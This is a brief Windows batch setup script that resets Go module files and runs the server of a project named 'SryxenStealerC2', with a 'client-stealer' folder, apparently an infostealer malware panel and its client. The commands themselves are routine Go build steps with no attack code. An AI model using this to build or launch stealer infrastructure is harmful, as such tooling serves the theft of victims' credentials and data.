@echo off
go env -w CGO_ENABLED=1
del go.mod
del go.sum
go mod init SryxenStealerC2 
go mod tidy
cd src
del go.mod
del go.sum
go mod init sryxen
go mod tidy
cd ..
cd client-stealer
del go.mod
del go.sum
cd ..
echo if you have issues with init db please make sure you have mingw, it needs it.
go mod tidy
go run main.go
